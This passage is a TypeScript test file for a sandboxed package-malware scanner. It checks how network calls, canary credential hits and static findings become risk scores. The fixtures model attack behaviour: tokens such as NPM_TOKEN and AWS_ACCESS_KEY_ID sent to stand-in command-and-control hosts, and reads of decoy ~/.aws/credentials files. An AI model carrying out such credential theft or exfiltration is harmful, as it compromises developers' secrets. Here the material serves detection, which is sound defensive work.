  assert.deepEqual(post.nonDistributionHosts, ["registry.npmjs.org"], "a write to the registry still counts");
});

test("score: package-manager traffic alone can never produce Malicious or High risk", () => {
  const call = (method: string, path: string, extra: Partial<ForgedCallData> = {}): ForgedCallData => ({ phase: "install", proto: "https", host: "registry.npmjs.org", port: 443, method, path, req_bytes: 100, forged_kind: "json", tls: "intercepted", canary_hits: [], ...extra });
  const tooling = deriveBehaviour({
    forgedCalls: [
      call("GET", "/-/npm/v1/attestations/@anthropic-ai/claude-agent-sdk-linux-x64-musl@0.3.293"),
      call("HEAD", "/@aws-sdk%2Ftypes"),
      call("POST", "/-/npm/v1/security/advisories/bulk"),
      { phase: "install", proto: "tcp", host: "registry.npmjs.org", port: 443, req_bytes: 0, forged_kind: "tls_refused", tls: "refused", canary_hits: [] },
    ],
    files: [],
    processes: [{ phase: "install", pid: 1, ppid: 0, argv: ["bash", "-c", "pnpm install --prefer-frozen-lockfile"] }],
    canaryInFiles: [],
    datagramEgress: [],
  });
  assert.deepEqual(tooling, NO_BEHAVIOUR);
  // Even with heavy static hits and a known-malicious dependency record, no behaviour means Caution at worst.
  const r = computeScore(input({ behaviour: tooling, staticFindings: [1, 2, 3, 4, 5, 6, 7].map((line) => sf({ line })), malicious: [{ ecosystem: "npm", name: "evil", version: "1.0.0", ids: ["MAL-2099-1"] }] }));
  assert.ok(r.verdict !== "Malicious" && r.verdict !== "High risk", r.verdict);
  assert.ok(r.score >= 60, String(r.score));
  // A credential in a registry request is still a canary hit, and a write elsewhere on the registry still counts.
  const exfil = deriveBehaviour({ forgedCalls: [call("GET", "/x", { canary_hits: ["NPM_TOKEN"] }), call("PUT", "/evil")], files: [], processes: [], canaryInFiles: [], datagramEgress: [] });
  assert.equal(exfil.canaryHits.length, 1);
  assert.deepEqual(exfil.nonDistributionHosts, ["registry.npmjs.org"]);
});

test("key-shaped strings are never a deduction by themselves; they become one Not verified line", () => {
  const keys = [
    sf({ rule: "heur.secret.private_key", file: "apps/a/form.tsx", line: 10 }),
    sf({ rule: "heur.secret.api_key", file: "apps/b/env.ts", line: 3 }),
    sf({ rule: "heur.secret.private_key", file: "apps/b/env.ts", line: 9 }),
  ];
  const r = computeScore(input({ staticFindings: keys }));
  assert.equal(r.breakdown.some((d) => d.code === "reachable_static_findings"), false);
  assert.ok(r.notVerified.includes("Key-shaped strings in 2 files, never seen leaving the machine."));
  // The same key seen leaving the machine is a behaviour deduction, scored in full.
  const leaked = computeScore(input({ staticFindings: keys, behaviour: { ...NO_BEHAVIOUR, canaryHits: ["AWS_ACCESS_KEY_ID sent to c2.example (https, install)"] } }));
  assert.ok(leaked.breakdown.some((d) => d.code === "canary_exfiltration"));
  assert.ok(leaked.score < 20);
});

test("a partial scan with only pattern hits stays at Low risk and says it is partial; caps still win", () => {
  const hits = [sf({}), sf({ file: "b.js", line: 2 }), sf({ file: "c.js", line: 3 }), sf({ file: "d.js", line: 4 })];
  const partial = computeScore(input({ install: "timeout", entry: "skipped", staticFindings: hits }));
  assert.equal(partial.partial, true);
  // Read only, never seen running: no points; the partial mark still shows.
  assert.ok(partial.score >= 80, String(partial.score));
  assert.ok(!partial.breakdown.some((d) => d.group === "static"));
  // A partial scan is capped at 80; a complete scan with the same hits is never lower.
  assert.equal(partial.score, 80);
  const complete = computeScore(input({ staticFindings: hits }));
  assert.equal(complete.partial, false);
  assert.ok(complete.score >= partial.score);
  // A lost record caps lower; the floor never lifts past a cap that applied.
  const lost = computeScore(input({ install: "timeout", entry: "skipped", staticFindings: hits, forensics: { coverage: "lost", gaps: [] } }));
  assert.ok(lost.score <= CAP_FORENSICS_LOST + 1);
  // Behaviour seen in the sandbox is never floored away.
  const seen = computeScore(input({ install: "timeout", entry: "skipped", staticFindings: hits, behaviour: { ...NO_BEHAVIOUR, decoyReads: ["/home/cr/.aws/credentials"] } }));
  assert.ok(seen.score < 80);
});

test("a build with no program to run is a partial scan; a program that ran and failed or hit its limit is not", () => {
  assert.equal(computeScore(input({ install: "completed", entry: "skipped" })).partial, true);
  assert.equal(computeScore(input({ install: "completed", entry: "failed" })).partial, false);
  assert.equal(computeScore(input({ install: "completed", entry: "timeout" })).partial, false);
  assert.ok(computeScore(input({ install: "completed", entry: "skipped" })).notVerified.some((l) => /Entry phase was skipped/.test(l)));
});

test("a repo with no install step is a partial scan: capped at Low risk 80 with the reason", () => {
  const r = computeScore(input({ install: "none", entry: "skipped" }));
  assert.equal(r.partial, true);
  assert.match(r.partialReason ?? "", /^Nothing to build/);
  assert.equal(r.score, 80);
  assert.equal(r.verdict, "Low risk");
  assert.ok(r.breakdown.some((d) => d.code === "cap_nothing_to_run"));
  assert.ok(r.notVerified.some((l) => /no install step/.test(l) && /read, not run/.test(l)));
  // A cut install is still a partial scan.
  assert.equal(computeScore(input({ install: "timeout", entry: "skipped" })).partial, true);
});

test("a plain blocked download that leads nowhere costs no points; data out, a canary, a served script or other bad behaviour still do", () => {
  const get = (host: string, over: Partial<ForgedCallData> = {}): ForgedCallData => ({ phase: "install", proto: "https", host, port: 443, method: "GET", path: "/vendor/linux/x64/tool", req_bytes: 0, forged_kind: "json", tls: "intercepted", canary_hits: [], ...over });
  const run = (calls: ForgedCallData[], files: FileEventData[] = []) => deriveBehaviour({ forgedCalls: calls, files, processes: [], canaryInFiles: [], datagramEgress: [] });
  const quiet = run([get("raw.example-cdn.invalid"), get("downloads.example.invalid")]);
  assert.deepEqual(quiet.nonDistributionHosts, []);
  assert.deepEqual(quiet.blockedPlainFetches, ["downloads.example.invalid", "raw.example-cdn.invalid"]);
  const r = computeScore(input({ behaviour: quiet, reputation: STRONG_REP }));
  assert.equal(r.score, 90);
  assert.ok(!r.breakdown.some((d) => d.code === "non_distribution_contact"));
  assert.ok(r.notVerified.some((l) => /^Blocked downloads: 2 plain requests/.test(l)));
  // Data going out, a canary, a script the forge served, or a refused TLS handshake still count.
  assert.deepEqual(run([get("c2.invalid", { method: "POST", req_bytes: 40 })]).nonDistributionHosts, ["c2.invalid"]);
  assert.deepEqual(run([get("c2.invalid", { req_bytes: 12 })]).nonDistributionHosts, ["c2.invalid"]);
  assert.deepEqual(run([get("c2.invalid", { canary_hits: ["GITHUB_TOKEN"] })]).nonDistributionHosts, ["c2.invalid"]);
  assert.deepEqual(run([get("c2.invalid", { forged_kind: "shell" })]).nonDistributionHosts, ["c2.invalid"]);
  assert.deepEqual(run([get("c2.invalid", { tls: "refused" })]).nonDistributionHosts, ["c2.invalid"]);
  // Followed by something bad (a decoy credential read): the plain fetch counts again.
  const bad = run([get("raw.example-cdn.invalid")], [{ phase: "install", op: "read_decoy", path: "/home/cr/.aws/credentials", pid: 7 }]);
  assert.deepEqual(bad.nonDistributionHosts, ["raw.example-cdn.invalid"]);
  assert.deepEqual(bad.blockedPlainFetches, []);
});
